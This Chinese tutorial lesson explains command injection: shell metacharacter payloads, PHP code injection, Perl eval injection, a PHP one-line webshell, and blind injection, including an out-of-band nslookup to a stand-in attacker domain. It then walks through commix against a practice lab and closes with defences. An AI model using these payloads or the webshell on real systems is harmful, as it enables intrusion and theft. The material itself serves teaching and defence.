你好，我是王昊天。

我们在生活中，经常会访问各种网页来获取信息。你有没有想过，我们除了可以获得网页上展示给我们的信息，还能获得它原本不打算展示给我们的信息，甚至可以在网页的服务器上运行我们想要执行的代码来搞一些破坏呢，这种行为就是命令注入。

相信你已经对命令注入有了极大的兴趣，这节课让我们一起来学习这个神奇的攻击方式。

## 命令注入

命令注入，就是在仅仅需要输入数据的场合，攻击者构造数据的同时输入了恶意命令代码，而系统并未过滤掉恶意命令，使得恶意命令代码一并执行，最终导致信息泄露或者正常数据遭到破坏。

在命令注入中，最常见的是 **操作系统命令注入**，攻击者可以使用这种注入攻击对服务器执行操作系统命令。例如攻击者可以执行命令 `rm -f`，来删除一些重要的文件。这是服务器的管理人员非常不想看到的，下面让我们一起来学习这个可怕的攻击方式吧。

### 操作系统命令注入

当一个Web应用，没有正确清理用户可控输入信息，那么它就有可能会受到此漏洞的影响。

如果这个漏洞存在，那么攻击者就具有执行操作系统命令的能力，就可以上传攻击程序，甚至获得密码信息。这对应用所在服务器会造成很严重的影响。

为了加深你的理解，我们一起来看一个有趣的示例。

有一个网页应用，它包含许多文件，我们可以通过网络访问到。当访问 `Doc1.pdf` 文件时，我们可以通过 `Burp Suite` 获取到如下 `HTTP POST` 请求。

```plain
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf

```

你可以通过这个示例注意到，应用是如何访问到指定文件的。现在我们来测试一下，能不能在这个请求中加入操作系统命令，进行注入操作。我们将上述请求修改如下。

```plain
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\

```

如果应用不对这个请求进行验证操作，我们可以获得如下的结果。

```plain
    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
             h4ck3r
             30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0

```

可以看到，我们成功实现了操作系统命令注入的攻击。这说明，我们发现了一个操作系统命令注入漏洞。接下来，我们就可以利用这个漏洞来获得我们想要的信息。那么，要如何获得这些信息呢？我整理了一些在Linux和Windows中常用的获取信息的操作系统命令。

```bash
#当我们想要获取系统当前用户名时，可以用下述命令。
whoami            (Linux/Windows)
#当我们想要获取操作系统信息时，可以用下述命令。
uname -a          (Linux)
ver               (Windows)
#当我们想要获取网络配置信息时，可以用下述命令。
ifconfig          (Linux)
ipconfig /all     (Windows)
#当我们想要获取网络连接信息时，可以用下述命令。
netstat -an       (Linux/Windows)
#当我们想要查看运行的进程时，可以用下述命令。
ps -ef            (Linux)
tasklist          (Windows)

```

每条命令的注释即为对应的功能，你可以看一下对此有个了解，在需要的时候对应自己的需求使用即可。

在上述示例中，我们实现了操作系统命令的注入。显而易见，在这个命令注入中，实现的关键是 `+|+Dir c:\` 这段恶意代码。我们主要利用了 `|` 这个特殊字符。事实上，绝大多数的命令注入都是通过特殊字符来实现的。下面让我们一起学习特殊字符的作用。

### 特殊字符

特殊字符，就是帮助我们实现命令注入的一些字符。我们可以在标准输入后加上特殊字符和我们想要实现注入的命令，来实现命令注入。

下面让我们一起来看看特殊字符有哪些。

不同的操作系统具有不同的特殊字符，这里我们先看在Windows系统和基于Unix的系统中都有效的特殊字符。

首先是 `|` 字符，我们可以利用它构造出命令： `cmd1|cmd2`。无论 `cmd1` 是否执行成功，该命令都会执行 `cmd2`。它的含义是，将 `cmd1` 的输出作为 `cmd2` 的输入。

其次是 `&` 字符，我们可以利用它构造出命令： `cmd1&cmd2`。和 `|` 字符类似，无论 `cmd1` 是否执行成功，该命令都会执行 `cmd2` 。 `cmd1 &` 的含义是，让命令 `cmd1` 在后台运行。我们可以在后面接上想要运行的命令，例如这里的 `cmd2`，该命令会正常运行。

接着我们来看 `||` 字符，我们可以利用它构造出命令： `cmd1||cmd2`。该命令中 `||` 是一个命令操作符，它会使得 `cmd2` 在 `cmd1` 执行失败的情况下被执行。

接着我们来看 `&&` 字符，它也是一个命令操作符，我们可以利用它构造出命令： `cmd1&&cmd2`。该命令会使得 `cmd2` 在 `cmd1` 执行成功的情况下被执行。

下面我们来看一些只在基于 `Unix` 的系统中才有效的命令。

我们来看 `;` 字符，它是一个命令之间的分隔符，我们可以利用它构造出命令： `cmd1;cmd2`。在该命令中，无论 `cmd1` 是否执行成功，该命令都会执行 `cmd2`。

经过上述学习，相信你对实现命令注入的典型方式，也就是特殊字符实现命令注入的方式，会有更加清晰的理解。除此之外，我们还可以通过其他方式实现命令注入，例如代码注入，下面让我们一起来学习它。

### 代码注入

通常，系统设计者为了系统顺利运行，会给用户一个数据的输入源，然后调用其中的数据去实现想要的功能。可是设计者没想到的是，用户输入的内容除了数据还有恶意代码。这种对恶意代码的防范不到位，导致的恶意代码执行，就是代码注入。

下面，我们一起来看一个示例来加深我们的理解。

```php
$MessageFile = "messages.out";
if ($_GET["action"] == "NewMessage") {
  $name = $_GET["name"];
  $message = $_GET["message"];
  $handle = fopen($MessageFile, "a+");
  fwrite($handle, "<b>$name</b> says '$message'<hr>\n");
  fclose($handle);
  echo "Message Saved!<p>\n";
}
else if ($_GET["action"] == "ViewMessages") {
  include($MessageFile);
}

```

程序设计者希望 `message` 参数仅仅为数据，只包含一个正常的数据文件的内容。但攻击者可以将它设置为： `message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E` 这样， `PHP` 就会将代码解析为 `<?php system("/bin/ls -l");?>` ，并且执行这段代码。这就导致这段代码会在 `/bin/` 目录下，运行 `ls -l` 这条命令，输出该目录下的文件和对应的权限，这段恶意代码会在用户使用 `ViewMessages` 功能时执行。

在代码注入中，我们经常会利用一些恶意函数，下面让我们一起来学习这些恶意函数。

### Eval注入

动态代码中，如果没有对指令进行正确地处理，就会出现Eval注入问题。主要是由于 `eval()` 函数引起，该函数允许在一行中执行多条命令。这给了攻击者可乘之机，它允许攻击者执行任意代码。

我们一起看一段示例来加深我们的理解。

```perl
use CGI qw(:standard);

sub config_file_add_key {
  my ($fname, $key, $arg) = @_;
  # code to add a field/key to a file goes here
}

sub config_file_set_key {
  my ($fname, $key, $arg) = @_;
  # code to set key to a particular file goes here
}

sub config_file_delete_key {
  my ($fname, $key, $arg) = @_;
  # code to delete key from a particular file goes here
}

sub handleConfigAction {
  my ($fname, $action) = @_;
  my $key = param('key');
  my $val = param('val');

  # this is super-efficient code, especially if you have to invoke
  # any one of dozens of different functions!
  my $code = "config_file_$action_key(\$fname, \$key, \$val);";
  eval($code);
}

$configfile = "/home/cwe/config.txt";
print header;
if (defined(param('action'))) {
  handleConfigAction($configfile, param('action'));
} else {
  print "No action specified!\n";
}

```

上述脚本想要获取 `action` 参数的值，并且基于参数值的不同来选择调用的功能。可调用的功能包括： `config_file_add_key()`、 `config_file_set_key()` 以及 `config_file_delete_key()`。可是 `eval()` 允许我们在一行代码中执行多个命令，这就导致了攻击者可以在 `action` 参数中提供其他值，例如： `add_key(",","); system("/bin/ls");`。

这样函数 `handleConfigAction()` 中的参数将会变为： `config_file_add_key(",","); system("/bin/ls");`。这样，除了预期之内的 `config_file_add_key(",",");` 函数会执行，攻击者的恶意命令 `system("/bin/ls");` 也会生效。

从上述内容中，我们会发现 `Eval` 是一个非常危险可怕的 `API`，所以在开发或者代码审计的时候，我们需要格外注意它。当然除了它，还有许多危险的 `API`， 下面让我们一起了解一下，在不同的语言中，分别存在哪些不同的函数来进行命令调用。

首先是 `Java` 中的 `Runtime.exec()` 函数，我们通过一个例子来理解这个函数。

```java
String [] cmd={"/bin/sh","-c","ln -s exe1 exe2"};
Process proc =Runtime.getRuntime().exec(cmd);

```

该示例是在 `Linux` 下利用 `Runtime.exec()` 函数调用系统命令的使用示例。

在C/C++中存在 `system`、 `exec` 以及 `ShellExecute` 函数，它们均调用自己参数中的命令去执行；Python中也有很多命令调用相关的函数，它们是 `exec`、 `eval`、 `os.system`、 `os.popen`、 `subprocess.popen` 以及 `subprocess.call` 函数；在PHP中存在 `system`、 `shell_exec`、 `exec`、 `proc_open` 以及与上面示例中同名的 `eval` 函数。

在用对应语言进行开发时，要对特别留意这些函数，否则将会造成严重后果。

可以看到，利用这些恶意函数，我们只要构造简短的代码就能实现命令注入攻击。你可能会误认为它是一句话代码，事实上它和一句话木马不是一回事。下面，让我们来看看它们的差别到底是什么。

### 一句话木马

一句话木马和Eval注入是比较相似的，我们先看看什么是一句话木马。

```php
<?php @eval($_POST['attack']);?>

```

上述代码就是一个最简单的一句话木马，我们需要利用文件上传漏洞，将它上传到目标网站，之后使用 `POST` 的方式传入 `attack` 的值对它进行访问。我们可以将 `attack` 的值设为 `echo 'a';`，这时代码就变为：

```php
<?php @eval("echo 'a';"); ?>

```

这样，我们就能使用一句话木马实现命令的执行。在这个一句话木马中，我们利用了PHP中的eval函数。总体来看，一句话木马和Eval注入都可以利用eval函数来实现命令的注入。不同的是，一句话木马需要利用攻击者上传的恶意文件中的eval函数去运行恶意命令，而Eval注入利用的则是应用本身设计不严谨的eval函数去运行恶意命令。

在弄清楚一句话木马和命令注入的区别后，我们对命令注入基础知识的学习就完成了。下面让我们开始进阶学习，了解在盲注的情况下，命令注入要如何完成。

### 命令盲注

在SQL注入中，我们学习过盲注的概念。其实在命令注入中，也有盲注的情况。下面我们来看看，在命令注入中是如何实现盲注的。

盲注意味着网络应用在 `HTTP` 响应中不返回我们注入的命令的输出结果。但是我们还是可以通过不同的方法来利用这个注入漏洞。下面我们来看三种解决盲注的方案，它们是时延注入、文件输出以及带外注入。

首先我们来看时延注入，这可以帮助我们确定，注入漏洞是否存在。在使用时延注入时，如果我们观察到应用是在我们设置的时延之后进行响应的，那么，尽管我们无法获得注入命令的输出值，也可以确定注入漏洞确实存在。

接下来是文件输出，通过这种方式，我们在 `HTTP` 响应中无法获取到的注入命令输出结果，可以通过其他方式获得。例如，我们可以将输出写入一个允许访问的静态资源下的文件里，写入之后访问该文件，就可以获得注入命令的输出值了。下面我们一起看一个示例来加深理解。

```bash
#应用允许访问的静态资源目录为 ‘/var/www/static/whoami.txt’。
#我们可以构造恶意命令为：
& whoami > /var/www/static/whoami.txt &
#之后我们就可以访问 'https://vulnerable-website.com/whoami.txt'来访问该文件获取我们注入命令的输出信息。

```

最后，我们还可以通过带外注入的方法来确认命令注入是否成功。

```plain
#假设攻击者有一个’kgji2ohoyw.web-attacker.com‘网址。
#注入的命令如下
& nslookup kgji2ohoyw.web-attacker.com &

```

这个注入命令会使用 `nslookup` 命令，对指定的域名进行 `DNS` 查询。攻击者可以观察到指定查找的发生过程，这样就可以判断出命令注入是否成功。

## 实战部分

下面我们一起来进行一个案例实战，该靶场已经搭建于谜团中，大家可以访问极客时间课程——命令注入靶场进行实战测试。在这次的案例实战中，我们用到了一个工具 `commix`，它的名字的含义为 `command injection exploiter`。从它的名字我们就能知道，这是一个命令注入工具。事实上它是一款开源工具，用于测试网络应用是否存在基于命令注入的漏洞。这款工具是自动检测的，我们不需要太多的手动操作。当它检测出注入的存在时，可以返回一个服务器上的 `shell`。

这款工具是用Python语言编写的，所以我们可以在Linux、Mac以及Windows系统中运行它。我们可以在“ [GitHub - commixproject/commix: Automated All-in-One OS Command Injection Exploitation Tool.](https://github.com/commixproject/commix)”这个页面获取该软件。下载完之后，我们可以用 `python commix.py -h`，获得该软件的用法。因为该工具参数太多，所以这里仅列举出常用的选项和参数。

```plain
Target:
#该选项必须被配置，用来定义目标的地址。
-u  URL            目标地址
Request:
#这些选项可以被用来明确如何链接到目标地址。
-d  DATA           通过POST方式上传的数据信息。
--host=HOST        设置HTTP主机信息。
--cookie=COOKIE    设置HTTP的cookie信息。
--user-agent=AGENT 设置HTTP的User-Agent信息。
Detection:
#这些选项用来设置检测方法
--level=LEVEL      设置检测的等级（1-3），默认为1。

```

这里靶场的代码为：

```php
<?php
  $cmd = $_GET["cmd"];
  if (isset($cmd))
  {
    system("echo ".$cmd);
  }
?>

```

可以看到，传入到参数 `cmd` 并没有被限制，我们可以用值为 `cmd=3|pwd` 的payload来实现命令注入，打开页面发现 `/var/www/html`，已经输出了我们注入命令的结果。

下面我们开始使用工具对靶场进行检测，例如这里打开的靶场地址为 `http://{yourdomain}.app.mituan.zone/index.php?cmd=3`

我们访问该地址下的 `index.php` 文件，并且需要提供一个参数 `cmd`，这里存在一个可能的注入点 `cmd`，我们使用 `commix` 测试是否可以实现命令注入。具体使用的过程如下：

```plain
#使用commix -u指定要进行测试的地址。
commix -u http://{yourdomain}.app.mituan.zone/index.php?cmd=3

```

![图片](https://static001.geekbang.org/resource/image/38/33/38625ee645538da47fbd4f7fabfb6d33.png?wh=1470x562)

在使用过程中，系统会问用户是否知道系统类型，因为它需要根据不同的系统使用不同的探测方式。因为这里的靶场是 `Unix` 靶场，所以我们选择 `Unix`。之后系统就会问我们是否需要弹出的 `shell`，我们选择 `是` 之后，就可以执行我们想要的命令啦。

## 安全实践

在这篇文章中，我们一起学习了操作系统命令注入、命令注入以及代码注入这三个注入问题，聪明的你可以想到什么抵御它们的方法吗？下面我们一起来看看我们该如何针对这些问题做好安全防范措施。

**对于操作系统命令注入的防范**

到目前为止，防止操作系统命令注入漏洞最有效的方法，就是阻止应用层代码调用操作系统命令。如果使用用户提供的输入来调用操作系统命令，是无法避免的，那么必须执行强输入验证，例如：白名单验证、输入字符类型限制等操作。

**对于代码注入的防范**

在应用设计阶段，我们可以让该应用在类似沙箱环境中运行代码，该环境在进程和操作系统之间要有严格的界限。这样就可以限制它对操作系统的影响，阻止它执行操作系统命令。在实施阶段，我们可以在输入验证中使用白名单策略来进行输入验证，从而降低代码注入的可能性。

## 总结

在这节课里，我们学习了命令注入漏洞。首先，我们学习了命令注入中使用最多的操作系统命令注入。我们了解到，可以使用操作系统命令注入的方式来获取到一些我们想要的信息，或者进行一些破坏行为。之后我们学习了如何使用特殊字符实现命令注入，并且介绍了多种特殊字符和它们适用的系统，为我们之后实际使用命令注入打下了基础。

除了使用特殊字符实现命令注入，我们还通过一个示例，学习了代码注入这种命令注入方式并对其中的一个实例，Eval注入进行深入学习。作为补充，我又列举了很多命令执行函数，希望你能对它们有一个大致的了解，在需要的时候，能够对应查看。

学习完命令注入的基础知识后，我们发现，命令注入和一句话木马是非常相似的，它们都可以利用eval函数来实现命令的注入。为了让你更好地区分，我向你介绍了它们的区别，一句话木马需要提前上传恶意文件，而命令注入是不需要的。做完上述知识储备后，我们学习了命令注入的一个具体场景——命令盲注。它和SQL注入类似，有多种解决方案，包括时延注入、带外注入以及文件输出等。

之后，我们进入到实战中，通过利用 `commix` 来实现命令注入的检测。在这个过程中，我们不仅学会了 `commix` 的使用方法，也加深了对命令注入的理解。

最后我们针对操作系统命令注入以及代码注入，学习了这两种命令注入方式的防范措施，主要方案都是用白名单验证来拦截恶意输入。

## 思考

命令注入和SQL注入最主要的区别是什么？

欢迎在评论区留下你的思考，我们下节课再见。